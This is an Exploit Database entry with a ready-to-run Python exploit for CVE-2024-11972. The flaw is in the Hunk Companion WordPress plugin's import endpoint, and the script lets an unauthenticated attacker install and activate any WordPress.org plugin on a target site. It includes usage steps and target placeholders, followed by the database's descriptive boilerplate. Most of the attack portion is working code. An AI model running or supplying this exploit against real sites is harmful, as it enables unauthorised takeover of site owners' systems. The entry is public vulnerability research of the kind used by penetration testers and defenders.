# Exploit Title: Hunk Companion Plugin 1.9.0 - Unauthenticated Plugin Installation
# Date: 16 December, 2024
# Exploit Author: Jun Takemura
# Author's GitHub: https://github.com/JunTakemura
# Author's Blog: juntakemura.dev
# Vendor Homepage: https://themehunk.com
# Software Link: https://wordpress.org/plugins/hunk-companion/
# Version: Tested on Hunk Companion 1.8.8
# CVE: CVE-2024-11972
# Vulnerability Description:
#     Exploits a flaw in the Hunk Companion plugin's permission_callback for the
#     /wp-json/hc/v1/themehunk-import endpoint, allowing unauthenticated attackers
#     to install and activate arbitrary plugins from the WordPress.org repository.
# Tested on: Ubuntu
# Original vulnerability discovered by: Daniel Rodriguez
#
# Usage:
#     1. Update `target_url` below with the target WordPress site's URL.
#     2. Update `plugin_name` with the slug of the plugin you want to install.
#     3. Run: python3 exploit.py
#
import requests
from urllib.parse import urljoin

# Update 'URL' with your target WordPress site URL, for example "http://localhost/wordpress"
target_url = "URL"

# Update 'NAME' with desired plugin's name (slug), for example "wp-query-console"
plugin_name = "NAME"

endpoint = "/wp-json/hc/v1/themehunk-import"
url = urljoin(target_url, endpoint)

payload = {
    "params": {
        "plugin": {
            plugin_name: "Plugin Label"
        },
        "allPlugins": [
            {
                plugin_name: f"{plugin_name}/{plugin_name}.php"
            }
        ],
        "themeSlug": "theme",
        "proThemePlugin": "plugin",
        "templateType": "free",
        "tmplFreePro": "theme",
        "wpUrl": target_url
    }
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64)",
    "Content-Type": "application/json"
}

try:
    response = requests.post(url, json=payload, headers=headers, timeout=10)
    response.raise_for_status()  # Raises an HTTPError if the response is not 2xx

    print(f"[+] Exploit sent successfully.")
    print(f"Response Status Code: {response.status_code}")
    print(f"Response Body: {response.text}")
except requests.exceptions.RequestException as e:
    print(f"[-] Request failed: {e}")

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed...
